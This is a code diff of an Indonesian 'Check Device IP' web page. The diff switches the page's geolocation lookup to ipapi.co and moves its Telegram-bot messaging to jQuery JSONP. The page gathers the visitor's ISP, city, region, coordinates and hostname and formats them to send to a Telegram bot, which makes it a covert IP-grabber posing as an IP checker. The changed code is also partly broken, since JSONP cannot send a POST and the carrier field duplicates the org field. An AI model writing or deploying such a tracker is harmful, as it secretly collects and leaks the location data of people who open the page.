@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Cek IP wwwPerangkat</title>
+  <title>Cek IP Perangkat</title>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
   <script>
     // Fungsi untuk mengirim pesan ke bot Telegram
@@ -16,36 +16,35 @@
         text: message
       };
 
-      // Kirim permintaan POST ke API Telegram menggunakan metode fetch()
-      fetch(url, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
+      // Kirim permintaan POST ke API Telegram menggunakan metode JSONP
+      $.ajax({
+        url: url,
+        type: 'POST',
+        data: data,
+        dataType: 'jsonp',
+        success: function(response) {
+          console.log('Pesan berhasil dikirim ke Telegram');
         },
-        body: JSON.stringify(data)
-      })
-      .then(function(response) {
-        console.log('Pesan berhasil dikirim ke Telegram');
-      })
-      .catch(function(error) {
-        console.error('Terjadi kesalahan saat mengirim pesan ke Telegram:', error);
+        error: function(error) {
+          console.error('Terjadi kesalahan saat mengirim pesan ke Telegram:', error);
+        }
       });
     }
 
     // Fungsi untuk mendapatkan informasi IP perangkat
     function getDeviceInfo() {
-      // Ambil informasi IP perangkat dari GeoIP2 API
-      $.get('https://geoip.maxmind.com/geoip/v2.1/city', function(response) {
+      // Ambil informasi IP perangkat menggunakan API ip-api.com
+      $.get('https://ipapi.co/json/', function(response) {
         // Ambil nilai-nilai yang diperlukan dari respons API
-        var isp = response.traits.isp;
-        var country = response.country.names.en;
-        var region = response.subdivisions[0].names.en;
-        var city = response.city.names.en;
-        var coordinates = response.location.latitude + ', ' + response.location.longitude;
+        var isp = response.org;
+        var country = response.country_name;
+        var region = response.region;
+        var city = response.city;
+        var coordinates = response.latitude + ', ' + response.longitude;
         var localTime = new Date().toLocaleString();
-        var domain = response.traits.domain;
-        var netSpeed = response.traits.connection_type;
-        var mobileCarrier = response.traits.mobile_network_operator;
+        var domain = response.hostname;
+        var netSpeed = response.connection;
+        var mobileCarrier = response.org;
 
         // Format pesan yang akan dikirim ke bot Telegram
         var message = `
